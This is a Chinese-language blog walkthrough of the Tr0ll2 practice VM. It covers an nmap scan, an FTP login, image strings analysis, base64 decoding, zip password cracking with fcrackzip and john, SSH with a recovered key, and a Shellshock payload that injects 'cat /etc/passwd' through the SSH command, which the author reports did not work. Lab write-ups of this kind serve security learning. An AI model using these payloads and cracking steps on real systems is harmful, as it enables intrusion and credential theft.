---
title: tr0ll2
datas: 2024.11.23
updated: 2024年11月23日
tags:
- 靶场
categories: 靶场
keywords:
description: tr0ll2

---

上来时经典的nmap扫面网段

```ABAP
┌──(root㉿kali)-[~]
└─# nmap -A 192.168.199.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 11:06 CST
Nmap scan report for 192.168.199.1
Host is up (0.00019s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_9.5 (protocol 2.0)
MAC Address: 00:50:56:C0:00:08 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11 (89%)
Aggressive OS guesses: Microsoft Windows 11 21H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 192.168.199.1

Nmap scan report for 192.168.199.2
Host is up (0.00021s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
53/tcp filtered domain
MAC Address: 00:50:56:E5:A4:9F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running: VMware Player
OS CPE: cpe:/a:vmware:player
OS details: VMware Player virtual NAT device
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.199.2

Nmap scan report for 192.168.199.132
Host is up (0.0031s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:0F:F4:68 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

可以看到靶机的ip是`192.168.199.132`，开放了21，22，80端口

访问80端口是这个东西

![](https://pic.imgdb.cn/item/6741541cd29ded1a8ca46da8.png)

这里说明了 作者是`tr0ll`，而且可以看到开放了21端口是一个ftp

ftp链接，账号密码都是`tr0ll`，进去看一下

![](https://pic.imgdb.cn/item/6741547ad29ded1a8ca4ece7.png)

里面有一个lmao.zip文件，下载下来看看

后台dirb一下靶机ip，发现有`robots.txt`

![](https://pic.imgdb.cn/item/674156e0d29ded1a8ca78e77.png)

wget下载下来，然后dirb扫描发现开放

![](https://pic.imgdb.cn/item/67415898d29ded1a8ca92bc9.png)

几个页面访问下来都是一样的

查看源码说是让我们抓取图片看看，wget下载下来就是

最早的项目中我们说就是分析图片的我们有三种方法

```ABAP
binwalk（路由逆向分析工具）

exiftool（图虫）

strings（识别动态库坂本指令）
```
strings分析得到
```
┌──(kali㉿kali)-[~/桌面/tr0ll2]
└─$ strings cat_the_troll.jpg
JFIF
#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
"aq2
\vRH
sdwTi
 aDP
 aDP
\z!$
`aDc
(Q@0S
}}HQ\)
B6F@
T"8V
!\#(
u6.U
6&      QY
;.e{
hH}Q
=\x#uk
?}1,;Gd
~>znk
BP~9D
QFQHQT
D       vOE
{"yw
.&9)
Km3Q
^Ah9]*
%DGU
WUh
:uWw
ALzO#
NO_`
F wT
s$3'
H=ev
0mwP
J,hi
nuMs[~
XSy}]F
Q{w}n=
{k{]&
Y]3P
D&ai
7+}(
jr'h
)0zZ
L!&\~T
`$3!
8]j,
K:/w.`'
~^GR
5zT)T
Rq<8
_mzN
S0=&
o&"8
;H!\M.
.l|(
fC@FO
8Yj5
f        &1
Cdb>
1<,n=
Ksbv
K       AM
j?w1
(669VNR
u%u|Pl
;Cw4d
Ps<o
rP{J
H!u-
Vcw9
)Qup=-kG+
$T3!k:~
;*iZ
wvwD
">8Z
mcc8=
IQTu
@rh8T
+sx(
kK+:
=GEZ
gugI
}wR.
-.u+
Dm3Q
+}[R
iZ{4
Xn_B
OYKH
8Hq%
 t+%s3
o=
<CgiZ
jnavF
]mb*=
N9Z<+
kF.j
$v_I
BI%z
2\7c
:t@n~@
        .qtI
$pGd
8VVz
nQ~4
j--h
8WSs
@QEw^?
nwyA
aQ3O
XBuJm08\&
"PzJz
>%cwJ
t+7>
'h(:
]O7U
ew\\
0>!-
1=xA0A
A+eW
H `q
B1Ow
~Q4awpX=
0J<n
v&8Y
Z8$.
yS-[
2 -,
e6mh
{D c
Il-FkKv
i{j68
XL{#
*Mqhq
O\ +
Sk~B
[jmdR
Ol;I
'%jq
iZ7%
Po.d
I {-G>
        ^ah
{)V,
8]-#
g<.}
'o&Q
4F8Q
        -wC
 F>J
_mg=
i{&0
1ancNpG*
=VZ[MH
hZOtY
'=!)
Bwgq
Ws_4\2{.M
&yC*
;,?     @
g%t.
).eG`
:q+|
tA{vF
_R4+
V'E[
XKwyDOt
f>U_
6 ;+5
q/2~WB
Xi]5
tT]+_
kTm6
0W;u
+cih
Qhcv
`*0G
nD{-4/
pzw\
GkDu(
FprFAF@
2;.uG
+=\k
UN"1
khTvH
Q}Jm
ee->
k!;Z
ivc2
ZMV0
-wI<
nCO%?C
.<vI
QLON
@Si;X'
f02HP
8Jh;
gYCJ
pV}A
7U      4
]=%em;
lj\p
*/ p?E$
Look Deep within y0ur_self for the answer
```

look deep within [y0ur_self]() for the answer
要你深入到这个目录进行下一步

访问，里面有一个`answer.txt`文件

wget下来

![](https://pic.imgdb.cn/item/67415dadd29ded1a8cadd186.png)


全是base64编码，通过`base64 -d answer.txt > having_decode.txt`得到解码后的

![](https://pic.imgdb.cn/item/67415e01d29ded1a8cae2094.png)

现在我们看回来哪个下载下下的lmao.zip,zip爆破的话有两种，分别是fcrackzip和zip2john

我们采用fcrackzip

![](https://pic.imgdb.cn/item/67415fc7d29ded1a8cafd4cc.png)

```ABAP
[-u] --use-unzip使用unzip清楚错误密码

[-D] --distionary使用字典爆破

[-p] --postion设置密码的位置

[-c] --charset设置字符集

[-b] --brute-force暴力破解

[-l] --length设置密码长度

[-u] --use-unzip使用unzip清楚错误密码

[-D] --distionary使用字典爆破

[-p] --postion设置密码的位置

[-c] --charset设置字符集

[-b] --brute-force暴力破解

[-l] --length设置密码长度

```
## John爆破文件

Docx ：

你可以进入`usr/share/john`查看john下的文件你会发现这个东西可以爆破7z,office等等文件

对于docx这种一般都是

```ABAP
./office2john.py test.docx > docx.txt   将docx的hash值保存在docx.txt文件中

john -w=./password|txt docx.txt  爆破docx文件
```

Xlsx：
和docx的一样

回归正题

密码爆破出来了,

ssh链接一下
```
ssh noob@192.168.199.132
```

要求我们输入密码，但是我们上面解压出来了一个私钥，理论上说是不需要密码直接可以登录的

```ABAP

chmod 400 noob
```

## 补充一下

chmod 是控制用户对文件的权限进行操作的命令

linux/unix的文件调用权限分为三级：文件所有者(owner)，用户组（group）,其他用户(other user)

![](https://pic.imgdb.cn/item/67429b70464e47f200109a98.png)

就像是这样的

![](https://pic.imgdb.cn/item/67429ba5464e47f20010bb87.png)

三位，第一位对应的是read读取，第二位对应的是write写入，第三个对应的是run执行

所以用二进制码就是

![](https://pic.imgdb.cn/item/67429c2f464e47f2001123b8.png)

报错格式不对（但是教学中时报TRY MARDER LOL!Connecction to xxx.xxx.xxx.xxx closed）🤔

![](https://pic.imgdb.cn/item/67429e04606cc3b2cd9f7a6b.png)

按照他说的是目标靶机的ssh配置有问题，他的环境变量不允许使用`/bin/bash`和`/bin/sh`

## shell破壳漏洞

shellshork原理

```ABAP
[04/14/2021 00:28] seed@ubuntu:~$ foo='() { echo "wdnmd"; } ;echo "8848";'
[04/14/2021 00:29] seed@ubuntu:~$ echo $foo
() { echo "wdnmd"; } ;echo "8848";
[04/14/2021 00:29] seed@ubuntu:~$ export foo
[04/14/2021 00:29] seed@ubuntu:~$ bash
8848
[04/14/2021 00:29] seed@ubuntu:~$ declare -f foo
foo ()
{
    echo "wdnmd"
}

```

foo原本是一个shell变量，但是在`export foo`使得其编程环境变量后，在子shell进程中,foo成为了一个函数，并且命令行自动执行了echo “8848”的命令

![](https://pic.imgdb.cn/item/6742b15188c538a9b5bb423a.png)

对于满足shellshock的情景，我们可以构造出一个特殊的字符串，使得字符串前面部分是空函数定义，后面是用分号隔开的恶意指令
- 环境变量必须以(){}开始
- 必须调用bash
- 系统存在bash漏洞

后面看教程是`ssh noob@192.168.199.132 -i noob '(){:;}; cat /etc/passwd'

但是不知道为什么我的就是打不进去，他是

![](https://pic.imgdb.cn/item/6742b9f188c538a9b5bb452b.png)

我是

![](https://pic.imgdb.cn/item/6742b9f188c538a9b5bb452a.png)

所以后面就没法弹shell进行下一步操作，[Troll2](https://www.freebuf.com/vuls/331990.html)
，后面想看的可以看这个，满详细的


